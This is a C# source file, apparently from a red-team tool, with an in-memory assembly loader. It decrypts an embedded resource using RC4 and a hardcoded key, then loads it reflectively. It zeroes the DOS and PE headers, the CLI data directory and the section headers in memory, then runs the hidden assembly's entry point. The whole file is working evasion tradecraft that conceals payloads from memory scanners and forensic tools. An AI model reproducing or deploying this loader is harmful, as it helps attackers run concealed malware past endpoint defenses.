using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace PositiveIntent
{
    internal class AssemblyHelper
    {
        public static void LoadAssembly(string[] args)
        {
            byte[] encryptedAssembly = Properties.Resources.File1;
            byte[] key = System.Text.Encoding.UTF8.GetBytes("DepthSecurity");
            RC4 rc4 = new RC4(key);

            // Decrypt assembly
            byte[] decryptedAssembly = rc4.EncryptDecrypt(encryptedAssembly);

            // Load assembly
            Assembly assembly = Assembly.Load(decryptedAssembly);

            // Overwrite byte array holding decrypted assembly after it's been loaded
            Array.Clear(decryptedAssembly, 0, decryptedAssembly.Length);

            // Get base address of loaded assembly
            IntPtr assemblyBaseAddress = Marshal.GetHINSTANCE(assembly.GetModules()[0]);

            unsafe
            {
                // Get pointer to assembly's base address
                byte* pBaseAddress = (byte*)assemblyBaseAddress.ToPointer();

                // Overwrite DOS header magic bytes ("MZ")
                Marshal.Copy(new byte[2], 0, (IntPtr)pBaseAddress, 2);

                // Read e_lfanew (4-byte integer at offset 0x3C)
                int e_lfanew = *(int*)(pBaseAddress + 0x3C);

                // Calculate size of DOS stub
                int dosStubSize = e_lfanew - 0x40; // e_lfanew - sizeof(IMAGE_DOS_HEADER)

                // Overwrite DOS stub (starting at offset 0x40)
                Marshal.Copy(new byte[dosStubSize], 0, (IntPtr)(pBaseAddress + 0x40), dosStubSize);

                // Get pointer to PE header
                byte* peHeader = pBaseAddress + e_lfanew;

                // Overwrite PE header magic bytes ("PE..")
                Marshal.Copy(new byte[4], 0, (IntPtr)(peHeader), 4);

                // Get pointer to optional Header (PE header + 24 bytes)
                byte* optionalHeader = peHeader + 24;

                // Determine PE architecture (PE32 or PE32+)
                ushort magic = *(ushort*)optionalHeader;
                int dataDirOffset = magic == 0x010B ? 0x60 : 0x70; // PE32: 0x60, PE32+: 0x70

                // Get pointer the CLI data directory entry (14th entry, index 13)
                byte* dataDirectory = optionalHeader + dataDirOffset;
                byte* cliEntry = dataDirectory + (13 * 8); // Offset to CLI data directory entry

                // Overwrite the RVA and size of CLI data directory entry
                byte[] stompedCliBytes = new byte[8];
                Marshal.Copy(stompedCliBytes, 0, (IntPtr)cliEntry, 8);

                // Read COFF header fields
                ushort numberOfSections = *(ushort*)(peHeader + 6);
                ushort sizeOfOptionalHeader = *(ushort*)(peHeader + 20);
                byte* sectionHeaders = peHeader + 24 + sizeOfOptionalHeader;

                // Overwrite section header names and characteristics
                for (int i = 0; i < numberOfSections; i++)
                {
                    byte* section = sectionHeaders + (i * 40);
                    Marshal.Copy(new byte[8], 0, (IntPtr)section, 8);
                    Marshal.Copy(new byte[4], 0, (IntPtr)section + 36, 4);
                }
            }

            // Find the entrypoint or "Main" method
            MethodInfo method = assembly.EntryPoint;

            // Get parameters
            object[] parameters = new[] { args };

            // Invoke the method with the specified parameters
            object execute = method.Invoke(null, parameters);
        }
    }
}
